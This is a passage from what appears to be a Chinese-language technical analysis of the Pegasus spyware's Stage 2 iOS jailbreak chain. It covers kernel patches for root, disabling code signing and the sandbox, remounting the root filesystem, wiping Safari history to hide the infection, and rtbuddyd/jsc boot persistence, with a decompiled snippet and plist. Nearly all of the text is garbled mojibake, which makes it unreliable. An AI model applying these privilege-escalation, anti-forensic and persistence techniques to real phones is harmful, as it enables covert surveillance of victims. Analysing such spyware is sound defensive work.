serializeè®¿é—®ï¼‰ï¼Œå®ƒåœ¨è°ƒç”¨è¦æ‰§è¡Œçš„å‡½æ•°åœ°å€ä¹‹å‰å°†å‚æ•°1æ”¾å…¥R3å’Œå‚æ•°2æ”¾å…¥R1ã€‚é€šè¿‡å°†æœªä½¿ç”¨çš„DWORDæ·»åŠ åˆ°æ•°æ®ç»“æ„ä¸­ï¼Œè¯¥æ•°æ®å—æˆä¸ºOSSerializerçš„vtableæ›¿ä»£å“ã€‚è¯¥æŠ€æœ¯ç”¨äº32Stage2ä¸­çš„ä¸¤ä¸ªä¸åŒå‡½æ•°ã€‚ ä¸€ä¸ªå‡½æ•°å…è®¸ä»»æ„å†…æ ¸å‡½æ•°è°ƒç”¨ï¼Œå¦ä¸€ä¸ªå‡½æ•°ç”¨äºå°†DWORDå€¼å†™å…¥å†…æ ¸åœ°å€ç©ºé—´ã€‚ ä¿®è¡¥å†…æ ¸ä»¥å…è®¸å†…æ ¸ç«¯å£è®¿é—®ç”±äºèƒ½å¤Ÿåœ¨å†…æ ¸åœ°å€ç©ºé—´å†…è¯»å–ï¼Œå†™å…¥å’Œæ‰§è¡Œä»»æ„ä½ç½®ï¼Œä¸‹ä¸€æ­¥æ˜¯é€šè¿‡å†…æ ¸ç«¯å£è·å¾—å¯¹å†…æ ¸çš„æ›´ç›´æ¥è®¿é—®ã€‚å¦‚æœä½¿ç”¨PIDå€¼0è°ƒç”¨ï¼Œåˆ™ _for_pid ä¼šè¿”å›é”™è¯¯ã€‚ä¸ºäº†ç»•è¿‡è¿™ç§ä¿æŠ¤ï¼Œç¬¬2é˜¶æ®µä¿®æ”¹äº†task_for_pidä¸­çš„å››ä¸ªä¸åŒä½ç½®ã€‚åœ¨å¼€å§‹ä¿®æ”¹task_for_pidä¹‹å‰ï¼Œé˜¶æ®µ2ç¡®å®šéœ€è¦ä¿®è¯¥æ”¹çš„åŒºåŸŸæ˜¯å¦åœ¨å¯è¯»å–/æ‰§è¡Œçš„å†…å­˜åŒºåŸŸå†…ã€‚å¦‚æœå†…å­˜ä¸å¯å†™ï¼Œåˆ™ç¬¬2é˜¶æ®µå°†ç›´æ¥ä¿®æ”¹å†…å­˜åŒºåŸŸçš„æƒé™ä»¥å…è®¸å†™è®¿é—®ï¼Œç„¶åä½¿dcacheæ— æ•ˆå¹¶åˆ·æ–°æ•°æ®å’ŒTLBsæŒ‡ä»¤ä»¥ç¡®ä¿å†…å­˜åŒºåŸŸè¿›è¡Œæƒé™æ›´æ–°ã€‚ ä¿®æ”¹task_for_pidä»¥å…è®¸è°ƒç”¨è€…è·å¾—å†…æ ¸çš„ç«¯å£åï¼Œ åœ¨è°ƒç”¨assertå›è°ƒå’Œé€€å‡ºä¹‹å‰ï¼Œç¬¬2é˜¶æ®µå°†å°è¯•é€šè¿‡è°ƒç”¨task_for_pidï¼ˆmach_task_selfï¼Œ0ï¼Œï¼†portï¼‰æ¥è·å–äº”æ¬¡å†…æ ¸ç«¯å£ï¼Œæ¯æ¬¡å°è¯•ä¹‹é—´æœ‰100æ¬¡æ¯«ç§’å»¶è¿Ÿã€‚ é˜¶æ®µä¸‰ï¼šææƒå’Œå®ç°è¶Šç‹±æœ¬èŠ‚ä»‹ç»åœ¨ç¬¬2é˜¶æ®µæ‰§è¡Œçš„æœ€ç»ˆæ­¥éª¤ï¼Œä»¥è·å–iPhoneä¸Šçš„rootè®¿é—®æƒé™ï¼Œç¦ç”¨ä»£ç ç­¾åï¼Œç„¶åå®ç°è¶Šç‹±ã€‚ æ­¤é˜¶æ®µåˆ©ç”¨æœ€ç»ˆçš„Tridentæ¼æ´ï¼Œè¯¥æ¼æ´ä¼šé€ æˆå†…æ ¸å†…å­˜æŸåå¯¼è‡´è¶Šç‹±ï¼ˆCVE-2016-4656ï¼‰ã€‚ ä¿®æ”¹ç³»ç»Ÿä»¥ææƒ32Stage2çš„ä¸‹ä¸€æ­¥æ˜¯åœ¨å—å®³è€…çš„æ‰‹æœºä¸Šè·å¾—rootè®¿é—®æƒé™ã€‚å¦‚æœç¬¬2é˜¶æ®µè¿›ç¨‹æ²¡æœ‰ä»¥rootç”¨æˆ·èº«ä»½è¿è¡Œï¼ˆUID = 0ï¼‰ï¼Œåœ¨éè¶Šç‹±æ‰‹æœºä¸Šä¸å¯èƒ½ä»¥rootè¿è¡Œï¼Œç¬¬2é˜¶æ®µä¼šä¿®è¡¥setreuidåŠŸèƒ½è·³è¿‡å¯¹ææƒçš„æ£€æŸ¥ã€‚è‹¥å¯¹setreuidçš„ä¿®æ”¹å®Œæˆï¼Œè¯¥å‡½æ•°æœ€å¤šè¢«è°ƒç”¨äº”æ¬¡ï¼ˆæ¯æ¬¡è°ƒç”¨ä¹‹é—´æœ‰500msçš„å»¶è¿Ÿï¼‰ï¼Œç›´åˆ°setreuidï¼ˆ0,0ï¼‰è¿”å›æˆåŠŸã€‚åœ¨äº”æ¬¡å°è¯•ä¹‹åï¼ˆæˆ–åœ¨æˆåŠŸçš„setreuidè°ƒç”¨ä¹‹åï¼‰ï¼Œä¿®æ”¹åçš„setreuidä¼šç»™å‡ºç›¸åçš„ç»“æœã€‚æœ€åæ£€æŸ¥è¿›ç¨‹çš„ç”¨æˆ·å€¼ï¼ˆUIDï¼‰ä»¥ç¡®ä¿å®ƒç¡®å®æ˜¯rootï¼ˆ0ï¼‰ã€‚ å¦‚æœå‡½æ•°getuidè¿”å›0ä»¥å¤–çš„ä»»ä½•å€¼ï¼Œåˆ™è°ƒç”¨assertå¹¶é€€å‡ºé˜¶æ®µ2ã€‚ é˜¶æ®µ2é€šè¿‡å®æ—¶æ—¶é’Ÿclock_get_attributesè°ƒç”¨å†…æ ¸å‡½æ•°kauth_cred_get_with_refï¼Œä»¥ä¾¿æ¥æ”¶ä¸»çº¿ç¨‹çš„å‡­è¯ã€‚åœ¨æ­¤ä¹‹åï¼Œç¬¬2é˜¶æ®µå°†æ‰¾åˆ°mac_policy_listï¼Œå…¶ä¸­åŒ…å«å½“å‰åŠ è½½åˆ°iOSå†…æ ¸ä¸­çš„è®¿é—®æ§åˆ¶ç­–ç•¥æ¨¡å—åˆ—è¡¨ã€‚é˜¶æ®µ2æ£€æŸ¥åˆ—è¡¨ï¼ŒæŸ¥æ‰¾ä»¥åç§°â€œSeatâ€å¼€å¤´çš„æ¨¡å—ï¼Œå¯å‚è€ƒâ€œSeatbeltæ²™ç®±ç­–ç•¥â€ã€‚å¦‚æœæœªæ‰¾åˆ°ç­–ç•¥æ¨¡å—ï¼Œåˆ™é˜¶æ®µ2è°ƒç”¨æ–­è¨€å›è°ƒå¹¶ç»ˆæ­¢ã€‚ä½†æ˜¯ï¼Œå¦‚æœæ‰¾åˆ°è¯¥æ¨¡å—ï¼Œåˆ™ä¼šè¯»å–å¹¶ä¿®æ”¹mpc_field_offï¼Œä»¥å…è®¸å½“å‰è¿›ç¨‹æ›´å¤§ç¨‹åº¦åœ°æ§åˆ¶å—å®³è€…çš„iPhoneã€‚ å› ä¸ºå¯è®¿é—®å†…æ ¸ç«¯å£å¹¶ä¸”åˆ é™¤äº†å°†é˜»æ­¢ç¬¬2é˜¶æ®µæ‰§è¡Œé€šå¸¸è¢«æ²™ç®±ç­–ç•¥é˜»æ­¢çš„æƒé™æ“ä½œçš„é™åˆ¶ï¼Œé˜¶æ®µ2ä¸å†éœ€è¦å®æ—¶æ—¶é’Ÿçš„getattrå¤„ç†ç¨‹åºã€‚ä¸ºäº†ç¡®ä¿å°†æ¥å¯¹æ­¤å¤„ç†ç¨‹åºçš„è°ƒç”¨ä¸ä¼šä½¿æ‰‹æœºå´©æºƒï¼Œå°†ä¿®æ”¹getattrå‡½æ•°æŒ‡é’ˆä»¥æŒ‡å‘æŒ‡ä»¤ï¼šBX LRè¿™ä¸ªæ–°çš„å¤„ç†å‡½æ•°æœ‰æ•ˆåœ°å°†æœªæ¥å¯¹å®æ—¶æ—¶é’Ÿçš„getattrè°ƒç”¨è½¬æ¢ä¸ºNOPã€‚è¿™å¯èƒ½æ˜¯ä¸ºäº†ç¡®ä¿å°†æ¥è°ƒç”¨getattrå¤„ç†ç¨‹åºï¼ˆé€šè¿‡æŸäº›å…¶ä»–è¿›ç¨‹ï¼‰ä¸ä¼šäº§ç”Ÿæ„å¤–åæœå¹¶å¯¼è‡´å†…æ ¸å´©æºƒã€‚ ç¦ç”¨ä»£ç ç­¾åé»˜è®¤æƒ…å†µä¸‹ï¼Œæ ‡å‡†iPhoneä¸Šçš„iOSå°†é˜»æ­¢æœªç­¾åçš„ä»£ç é€šè¿‡æ­£å¸¸æ–¹å¼è¿è¡Œï¼Œä¾‹å¦‚execvæˆ–ç³»ç»Ÿè°ƒç”¨ã€‚åŒæ ·ï¼Œé€šè¿‡å°†æ–‡ä»¶ç³»ç»Ÿè®¾ç½®ä¸ºåªè¯»ï¼Œå¯ä»¥é˜²æ­¢å¯¹æ ¹æ–‡ä»¶ç³»ç»Ÿçš„ä¿®æ”¹ã€‚è¿™äº›æƒ…å†µå°†é˜»æ­¢ç¬¬2é˜¶æ®µæ‰§è¡Œè¶Šç‹±ç¨‹åºï¼Œå¹¶å°†é˜»æ­¢è¶Šç‹±ç¨‹åºï¼ˆå¦‚æœå®ƒæ¿€æ´»ï¼‰ä¿®æ”¹ç³»ç»Ÿã€‚ç¬¬2é˜¶æ®µä¿®æ”¹äº†å‡ ä¸ªå†…æ ¸å‡½æ•°å’Œä¸¤ä¸ªå†…æ ¸æ‰©å±•ï¼ˆkextï¼‰ï¼Œä»¥å…è®¸è¿™äº›ç¦æ­¢çš„æ“ä½œã€‚ç¬¬2é˜¶æ®µé¦–å…ˆæ‰¾åˆ°com.apple.driver.AppleMobileFileIntegrityå’Œcom.apple.driver.LightweightVolumeManagerçš„kextã€‚com.apple.driver.AppleMobileFileIntegrityï¼ˆAMFIï¼‰æ‰©å±•ç¨‹åºè´Ÿè´£å®æ–½iOSçš„ä»£ç ç­¾ååŠŸèƒ½ã€‚com.apple.driver.LightweightVolumeManageræ‰©å±•è´Ÿè´£ä¸»å­˜å‚¨è®¾å¤‡çš„åˆ†åŒºè¡¨ã€‚é˜¶æ®µ2é€šè¿‡è°ƒç”¨OSKextCopyLoadedKextInfoæ¥å®šä½æ¯ä¸ªæ‰©å±•ï¼Œè¯¥å‡½æ•°è¿”å›å«æœ‰æ‰©å±•ä¿¡æ¯çš„å­—å…¸å¯¹è±¡ã€‚åœ¨å­—å…¸ä¸­çš„æ˜¯å½“æ‰©å±•è¢«è°ƒç”¨æ—¶çš„åŠ è½½åç§»é‡ï¼Œé˜¶æ®µäºŒé€šè¿‡æ·»åŠ ä¸€å·²çŸ¥çš„åç§»é‡å°†å…¶æ”¾å…¥å†…æ ¸åœ°å€ä¸­ã€‚ ä½¿ç”¨AMFIçš„å†…æ ¸åœ°å€ï¼Œé˜¶æ®µ2å®šä½ä»¥ä¸‹å…¨å±€å˜é‡ï¼šamfi_get_out_of_my_waycs_enforcement_disableè¿™ä¸¤ä¸ªå˜é‡åœ¨è®¾ç½®å¥½åä¼šç¦ç”¨AFMIå¹¶ç¦ç”¨ä»£ç ç­¾åã€‚ç„¶åï¼Œé˜¶æ®µ2è®¾ç½®å¦å¤–ä¸¤ä¸ªå…¨å±€å˜é‡ï¼šdebug _ flagså’ŒDEBUGflagã€‚ è¿™ä¸¤ä¸ªå˜é‡å…è®¸å¯¹å—å®³è€…çš„iPhoneè¿›è¡Œè°ƒè¯•æƒé™ï¼Œè¿›ä¸€æ­¥å‡å°‘æ²™ç®±ï¼ˆSEATBELTï¼‰å¯¹è®¾å¤‡æ–½åŠ çš„é™åˆ¶ã€‚ æ¥ä¸‹æ¥ï¼Œç¬¬2é˜¶æ®µä¿®æ”¹å†…æ ¸å‡½æ•°vm_map_enterå’Œvm_map_protectï¼Œä»¥ä¾¿åœ¨è™šæ‹Ÿå†…å­˜ç®¡ç†å™¨ä¸­ç¦ç”¨ä»£ç ç­¾åéªŒè¯ï¼ˆå¯ä»¥åˆ†é…RWXåŒºåŸŸï¼‰ã€‚åœ¨æ­¤ä¹‹åï¼Œç¬¬2é˜¶æ®µä¿®æ”¹LightweightVolumeManagerä¸­çš„_mapForIOå‡½æ•°ï¼Œç„¶åä¿®æ”¹å†…æ ¸å‡½æ•°csopsä»¥ç¦ç”¨æ›´å¤šçš„ä»£ç ç­¾åä¿æŠ¤ã€‚ é‡æ–°å®‰è£…é©±åŠ¨å™¨ä¸ºäº†è¶Šç‹±è®¾å¤‡ï¼Œå¿…é¡»æ‹¥æœ‰æ ¹æ–‡ä»¶ç³»ç»Ÿå†™æƒé™ã€‚é˜¶æ®µ2é€šè¿‡å¯¹/ sbin / launchdè°ƒç”¨è®¿é—®å‡½æ•°æ¥æµ‹è¯•æ ¹æ–‡ä»¶ç³»ç»Ÿçš„å¯å†™æ€§ï¼Œä»¥ç¡®å®šé˜¶æ®µ2æ˜¯å¦å…·æœ‰å¯¹æ ¹æ–‡ä»¶ç³»ç»Ÿçš„å†™è®¿é—®æƒã€‚å¦‚æœæ–‡ä»¶æ˜¯åªè¯»çš„ï¼Œåˆ™ç¬¬2é˜¶æ®µä¿®è¡¥å†…æ ¸å‡½æ•°_ mac _ mountä»¥ç¦ç”¨ä¿æŠ¤ç­–ç•¥ï¼Œè¯¥ç­–ç•¥é˜»æ­¢å°†æ–‡ä»¶ç³»ç»Ÿé‡æ–°å®‰è£…ä¸ºè¯»/å†™ï¼Œç„¶åé€šè¿‡è°ƒç”¨mount(â€œhfsâ€, â€œ/â€, MNT _ UPDATE ,mountData)å°†rootæ–‡ä»¶ç³»ç»Ÿé‡æ–°å®‰è£…ä¸ºè¯»/å†™ï¼Œå…¶ä¸­mountDataæŒ‡å®š/ dev / disk0s1s1è®¾å¤‡ã€‚ å¦‚æ­¤ç¼–å†™ä½¿å¾—å®ƒåªèƒ½åœ¨iOS 9ç³»åˆ—iPhoneä¸Šè¿è¡Œï¼Œä½†ä»£ç å­˜åœ¨è¡¨æ˜å®ƒæ›¾ç»åœ¨è¾ƒæ—§çš„iOSç‰ˆæœ¬ä¸Šä½¿ç”¨è¿‡ã€‚ä½œä¸ºæ”¯æŒæ­¤å£°æ˜çš„è¯æ®ï¼Œåœ¨ç¬¬2é˜¶æ®µé‡æ–°å®‰è£…æ ¹æ–‡ä»¶ç³»ç»Ÿåä¼šè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœå®ƒåœ¨iOS 7ï¼ŒiOS 8æˆ–iOS 9ä¸Šè¿è¡Œï¼Œåˆ™ä¿®æ”¹å…¶æ‰§è¡Œè·¯å¾„ã€‚æ ¹æ®iOSç‰ˆæœ¬ï¼Œå‡½æ•°åœ¨/ bin / launchctlï¼ˆé€‚ç”¨äºiOS 7å’Œ8ï¼‰æˆ–/ bin / launchdï¼ˆé€‚ç”¨äºiOS 9ï¼‰ä¸Šè°ƒç”¨fsctlã€‚fsctlå°†ä¿®æ”¹ä½ç£ç›˜ç©ºé—´è­¦å‘Šé˜ˆå€¼ä»¥åŠæä½ç£ç›˜ç©ºé—´è­¦å‘Šé˜ˆå€¼ï¼Œåˆ†åˆ«å°†å€¼è®¾ç½®ä¸º8192å’Œ8208ã€‚ æ¸…ç†ç”±äºSafariä¸­å…è®¸ä»»æ„ä»£ç æ‰§è¡Œçš„æ¼æ´ï¼Œç¬¬2é˜¶æ®µè¢«æ¿€æ´»ã€‚ä½œä¸ºç¬¬2é˜¶æ®µåœ¨å®ç°è¶Šç‹±ä¹‹å‰æ‰§è¡Œçš„æœ€åä¸€é¡¹æ´»åŠ¨ä¹‹ä¸€ï¼Œç¬¬2é˜¶æ®µå°è¯•é€šè¿‡æ¸…ç†Safariä¸­çš„å†å²è®°å½•å’Œç¼“å­˜æ–‡ä»¶æ¥è¦†ç›–å…¶æ„ŸæŸ“å‘é‡ã€‚æ¸…é™¤Safariæµè§ˆå™¨å†å²è®°å½•å’Œç¼“å­˜æ–‡ä»¶çš„è¿‡ç¨‹éå¸¸ç®€å•ï¼Œå¹¶ä¸”ç‰¹å®šäºiOSç‰ˆæœ¬ã€‚ å¯¹äºiOS 8å’ŒiOS 9ï¼ˆå¦‚æœæœªåœ¨iOS 9ä¸Šè¿è¡Œï¼Œç¬¬2é˜¶æ®µå°†åœ¨å¼€å§‹æ—¶ç»ˆæ­¢ï¼‰ï¼Œå°†ä»å—å®³è€…çš„iPhoneä¸­ç«‹å³åˆ é™¤ä»¥ä¸‹æ–‡ä»¶ä»¥åˆ é™¤æµè§ˆå™¨å’Œç¼“å­˜ä¿¡æ¯ï¼š â€¢ /Library/Safari/SuspendState.plist â€¢ /Library/Safari/History.db â€¢ /Library/Safari/History.db-shm â€¢ /Library/Safari/History.db-wal â€¢ /Library/Safari/History.db-journal â€¢ /Library/Caches/com.apple.mobilesafari/Cache.db â€¢ /Library/Caches/com.apple.mobilesafari/Cache.db-shm â€¢ /Library/Caches/com.apple.mobilesafari/Cache.db-wal â€¢ /Library/Caches/com.apple.mobilesafari/Cache.db-journal â€¢ (files in the directory) /Library/Caches/com.apple.mobilesafari/fsCachedData/ å¯¹äºiOS 7ï¼Œå°†åˆ é™¤ä»¥ä¸‹æ–‡ä»¶ï¼š â€¢ /Library/Caches/com.apple.mobilesafari/Cache.db â€¢ /Library/Caches/com.apple.mobilesafari/Cache.db-shm â€¢ /Library/Caches/com.apple.mobilesafari/Cache.db-wal â€¢ /Library/Caches/com.apple.mobilesafari/Cache.db-journal æœ€åè°ƒç”¨syncï¼Œä»¥ç¡®ä¿å°†åˆ é™¤å†™å…¥ç£ç›˜ã€‚ ä¸‹ä¸€é˜¶æ®µå®‰è£…å†æ¬¡ç»™å‡ºä½¿ç”¨æœ€åˆé’ˆå¯¹è¾ƒæ—§çš„iOSç‰ˆæœ¬çš„ä»£ç çš„è¯æ®ï¼Œä¸»çº¿ç¨‹è°ƒç”¨çš„ä¸‹ä¸€ä¸ªå‡½æ•°è¿›è¡Œè§£å‹ç¼©å¹¶å°†ä¸¤ä¸ªæ–‡ä»¶æ”¾åˆ°å—å®³è€…çš„æ–‡ä»¶ç³»ç»Ÿä¸Šã€‚ä»¥ä¸‹ä»£ç æ®µè¯´æ˜äº†Stage 2å¦‚ä½•ç¡®å®šè¶Šç‹±äºŒè¿›åˆ¶æ–‡ä»¶åœ¨å—å®³è€…è®¾å¤‡ä¸Šçš„ä½ç½®ï¼š if ( ( unsigned int) ( majorVersion -8 )) { if ( majorVersion ==7 ){ pszJBFilenamePath = &quot;/bin/sh&quot;; if( flag ) pszJBFilenamepath = &quot;/private/var/tmp/jb-install&quot;; } else{ assert(); writeLog(3, &quot;%.2s%5.5d\\n&quot;, &quot;bh.c&quot;, 134); exit(-1); pszJBFilenamePath =0; } } else { pszJBFilenamePath = &quot;/sbin/mount_nfs.temp&quot;; } ä»£ç ç‰‡æ®µæ˜¾ç¤ºï¼Œå¯¹äºiOSç‰ˆæœ¬7ï¼Œä¸‹ä¸€é˜¶æ®µäºŒè¿›åˆ¶æ–‡ä»¶çš„å®‰è£…è·¯å¾„æ˜¯/ bin / shæˆ–/ private / var / tmp / jb-installï¼ˆå¦‚æœflagä¸ºéé›¶ï¼‰ã€‚å¯¹äºæ—©äº7çš„iOSç‰ˆæœ¬ï¼Œå°†è°ƒç”¨æ–­è¨€å›è°ƒå¹¶ç»ˆæ­¢ç¨‹åºã€‚ å¯¹äºiOS 8åŠæ›´é«˜ç‰ˆæœ¬ï¼Œå®‰è£…è·¯å¾„æŒ‡å®šä¸º/ sbin / mount _ nfs.tempã€‚ åŒ…å«ä¸‹ä¸€é˜¶æ®µäºŒè¿›åˆ¶çš„æ•°æ®blobçš„å¤§å°è¢«éªŒè¯ä¸ºéé›¶ã€‚å¦‚æœå¤§å°ä¸ºé›¶ï¼Œåˆ™å‘ç”Ÿæ–­è¨€å›è°ƒå¹¶ç»ˆæ­¢ç¬¬2é˜¶æ®µã€‚ç„¶åï¼Œé˜¶æ®µ2ä½¿ç”¨BZ2 _ * APIå‡½æ•°å°†æ•°æ®è§£å‹ç¼©ä¸ºä¸¤ä¸ªæ–‡ä»¶ï¼šç¬¬ä¸€ä¸ªæ–‡ä»¶æ˜¯ä¸‹ä¸€ä¸ªé˜¶æ®µçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¯¹äºiOS 9ï¼Œå®ƒå­˜å‚¨åœ¨/ sbin / mount _ nfs.tempä¸­ã€‚ ç¬¬äºŒä¸ªæ–‡ä»¶æ˜¯é…ç½®æ–‡ä»¶ï¼Œå­˜å‚¨åœ¨/ private / var / tmp / jb _ cfgä¸­ã€‚ åœ¨æ§åˆ¶è¿”å›ä¸»çº¿ç¨‹ä¹‹å‰ï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶çš„æƒé™æ›´æ”¹ä¸º0755ï¼ˆä½¿æ–‡ä»¶å¯æ‰§è¡Œï¼‰ã€‚ Stage 2åœ¨ç»ˆæ­¢ä¹‹å‰è°ƒç”¨çš„æœ€ç»ˆå‡½æ•°è´Ÿè´£ç§»åŠ¨ä¸Šä¸€æ­¥éª¤ä¸­æ”¾ä¸‹çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚å¯¹äºiOSç‰ˆæœ¬8å’Œ9ï¼Œæ–‡ä»¶/ sbin / mount _ nfs.tempé‡å‘½åä¸º/ sbin / mount _ nfsã€‚å¦‚æœå—å®³è€…æ‰‹æœºä¸Šçš„iOSæ˜¯iOS 9ï¼Œåˆ™ä¼šåœ¨é‡å‘½åæ“ä½œä¹‹å‰å°è¯•åˆ é™¤/ sbin / mount _ nfsã€‚é‡å‘½åæ–‡ä»¶åï¼Œè°ƒç”¨assertå›è°ƒå‡½æ•°ï¼Œç„¶åè°ƒç”¨exitå‡½æ•°ï¼Œç»ˆæ­¢Stage 2ã€‚ ä¸€æ—¦æ‰§è¡Œè¿”å›ä¸»çº¿ç¨‹ï¼Œç¬¬2é˜¶æ®µå°†ä»¥é™é»˜æ–¹å¼ç»ˆæ­¢ ç°æœ‰çš„è¶Šç‹±æ£€æµ‹å¦‚å‰æ‰€è¿°ï¼ŒStage 2äºŒè¿›åˆ¶æ–‡ä»¶ä»¥ä¸¤ç§ä¸åŒçš„æ¨¡å¼è¿è¡Œã€‚ç¬¬ä¸€ä¸ªå·²ç»è®¨è®ºè¿‡ï¼Œå…¶æ„æˆäº†ä¸€ä¸ªå®Œæ•´çš„iOSæ¼æ´åˆ©ç”¨å’Œè¶Šç‹±ã€‚ ç¬¬äºŒä¸ªæ˜¯åœ¨å·²ç»è¶Šç‹±çš„ç³»ç»Ÿä¸Šè¿è¡ŒStage 2äºŒè¿›åˆ¶æ–‡ä»¶æ—¶æ‰€é‡‡ç”¨ç­–ç•¥ã€‚åœ¨ç¬¬äºŒæ¨¡å¼ä¸‹ï¼Œç¬¬2é˜¶æ®µåªæ˜¯åˆ©ç”¨ç°æœ‰çš„è¶Šç‹±åé—¨æ¥å®‰è£…Pegasusç‰¹å®šçš„å†…æ ¸è¡¥ä¸ã€‚ ä¸ºäº†ç¡®å®šè®¾å¤‡æ˜¯å¦å·²ç»è¶Šç‹±ï¼Œç¬¬2é˜¶æ®µå°è¯•åˆ©ç”¨å¸¸è§çš„è¶Šç‹±åé—¨è·å–è¿›å…¥iOSå†…æ ¸çš„æœ‰æ•ˆæœºå™¨ç«¯å£ã€‚åªéœ€é€šè¿‡è°ƒç”¨task _ for _ pidå¹¶å°†PIDå€¼è®¾ç½®ä¸º0æ¥æ‰§è¡Œæ­¤æ£€æŸ¥ã€‚ ä¿®æ”¹task _ for _ pidæ˜¯iOSè¶Šç‹±ä½¿ç”¨çš„å¸¸è§åé—¨æœºåˆ¶ï¼Œå®ƒä½¿ç”¨æˆ·æ¨¡å¼è¿›ç¨‹æœ‰ç›´æ¥å†…æ ¸å†…å­˜è®¿é—®çš„æƒåŠ›ã€‚iOSé€šå¸¸ä¸å…è®¸ä½¿ç”¨PIDä¸º0çš„task _ for _ pidã€‚å¦‚æœtask _ for _ pidè¿”å›æœ‰æ•ˆçš„ä»»åŠ¡ç«¯å£ï¼ŒStage 2è¿›ç¨‹å°±å¯ä»¥æå‡å¯¹å†…æ ¸çš„è®¿é—®æƒé™ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ”¾å¼ƒå‰é¢æè¿°çš„æƒé™æå‡æ­¥éª¤ã€‚ é˜¶æ®µ2è¿˜æ£€æŸ¥/ bin / shåœ¨ä¸åœ¨ã€‚åœ¨æœªè¶Šç‹±æ‰‹æœºä¸Šï¼Œè¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶æ°¸è¿œä¸åº”è¯¥å­˜åœ¨ã€‚å½“é˜¶æ®µ2æ£€æµ‹åˆ°æ­¤äºŒè¿›åˆ¶æ–‡ä»¶çš„å­˜åœ¨æ—¶ï¼Œå®ƒå‡å®šç°æœ‰çš„è¶Šç‹±ç¨‹åºä¸Pegasusä¸å…¼å®¹æˆ–è€…æ‰€æœ‰å¿…éœ€çš„å†…æ ¸è¡¥ä¸å·²ç»åˆ°ä½å¹¶ä¸”ä¸éœ€è¦è¿›ä¸€æ­¥çš„æ“ä½œã€‚å½“åœ¨è®¾å¤‡ä¸Šå­˜åœ¨/ bin / shæ—¶ï¼Œé˜¶æ®µ2ä¸ç”¨è¿›è¡Œæ”»å‡»ç›´æ¥é€€å‡ºå³å¯ã€‚ å››ï¼šPegasusæŒä¹…æ€§æœºåˆ¶æœ¬èŠ‚è¯¦ç»†ä»‹ç»äº†Pegasusé€šè¿‡Tridentæ¼æ´è¿›è¡Œæ”»å‡»åä¿ç•™åœ¨è®¾å¤‡ä¸Šçš„æŒä¹…æ€§æœºåˆ¶ï¼Œå¹¶åœ¨æ¯æ¬¡è®¾å¤‡é‡æ–°å¯åŠ¨æ—¶ç»§ç»­æ‰§è¡Œæœªç­¾åçš„ä»£ç ã€‚ PegasusæŒä¹…æ€§æœºåˆ¶Pegasusä½¿ç”¨çš„æŒä¹…æ€§æœºåˆ¶åœ¨æ¯æ¬¡è®¾å¤‡å¯åŠ¨æ—¶å¯é åœ°æ‰§è¡Œæœªç­¾åçš„ä»£ç ï¼ˆå¹¶æœ€ç»ˆæ‰§è¡Œå†…æ ¸æ¼æ´ä»¥å†æ¬¡è¶Šç‹±è®¾å¤‡ï¼‰ä¾èµ–äºä¸¤ä¸ªä¸åŒé—®é¢˜çš„ç»„åˆã€‚ ç¬¬ä¸€ä¸ªé—®é¢˜æ˜¯plistä¸­å­˜åœ¨rtbuddydæœåŠ¡ï¼ˆåœ¨è®¾å¤‡å¯åŠ¨æ—¶å¯åŠ¨ï¼‰ã€‚è¯·æ³¨æ„ï¼Œåœ¨iOS 10ä¹‹å‰ï¼Œrtbuddydå­˜åœ¨äºæŸäº›iPhoneè®¾å¤‡ä¸Šï¼Œä¾‹å¦‚iPhone 6Sï¼Œä½†ä¸å­˜åœ¨äºiPhone 6ç­‰å…¶ä»–è®¾å¤‡ä¸Šã€‚å› æ­¤ï¼Œä»»ä½•å¯ä»¥å¤åˆ¶åˆ°æŒ‡å®šè·¯å¾„ï¼ˆ/ usr / libexec / rtbuddydï¼‰çš„å·²ç­¾åäºŒè¿›åˆ¶æ–‡ä»¶éƒ½å°†åœ¨å¼•å¯¼æ—¶ä½¿ç”¨plistä¸­æŒ‡å®šçš„å‚æ•°ï¼ˆç‰¹åˆ«æ˜¯â€œ--early-bootâ€ï¼‰æ‰§è¡Œã€‚ &lt;key&gt; rtbuddy&lt;/key&gt;&lt;dict&gt;&lt;key&gt;ProgramArguments&lt;/key&gt;&lt;array&gt;&lt;string&gt;rtbuddy&lt;/string&gt;&lt;string&gt;--early-boot&lt;/string&gt;&lt;/array&gt;&lt;key&gt;PerformInRestore&lt;/key&gt;&lt;true/&gt;&lt;key&gt;RequireSucess&lt;/key&gt;&lt;true/&gt;&lt;key&gt;Program&lt;/key&gt;&lt;string&gt;/usr/libexec/rtbuddy&lt;/string&gt;&lt;/dict&gt; ç”±äºæ­¤è¡Œä¸ºï¼Œç³»ç»Ÿä¸Šçš„ä»»ä½•å·²ç­¾åäºŒè¿›åˆ¶æ–‡ä»¶éƒ½å¯ä»¥åœ¨å¼•å¯¼æ—¶ä½¿ç”¨å•ä¸ªå‚æ•°æ‰§è¡Œã€‚é€šè¿‡åœ¨å½“å‰å·¥ä½œç›®å½•ä¸­åˆ›å»ºåä¸º--early-bootçš„ç¬¦å·é“¾æ¥ï¼Œå¯ä»¥å°†ä»»æ„æ–‡ä»¶ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’ç»™å·²å¤åˆ¶åˆ°rtbuddydä½ç½®çš„ä»»æ„å·²ç­¾åäºŒè¿›åˆ¶æ–‡ä»¶ã€‚ æ­¤æŒä¹…æ€§æœºåˆ¶ä¸­åˆ©ç”¨çš„ç¬¬äºŒä¸ªé—®é¢˜æ˜¯JavaScriptCoreäºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„æ¼æ´ã€‚Pegasusåˆ©ç”¨å‰é¢æè¿°çš„æ–¹æ³•ï¼Œé€šè¿‡å°†æ–‡ä»¶å¤åˆ¶åˆ°/ usr / libexec / rtbuddydæ¥æ‰§è¡ŒjscäºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆJavaScriptCoreï¼‰ã€‚ç„¶åå¯ä»¥é€šè¿‡åˆ›å»ºåä¸º--early-bootçš„ç¬¦å·é“¾æ¥æ¥æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œè¯¥ç¬¦å·é“¾æ¥æŒ‡å‘è¦åœ¨å¼•å¯¼æ—¶æ‰§è¡Œçš„ä»£ç 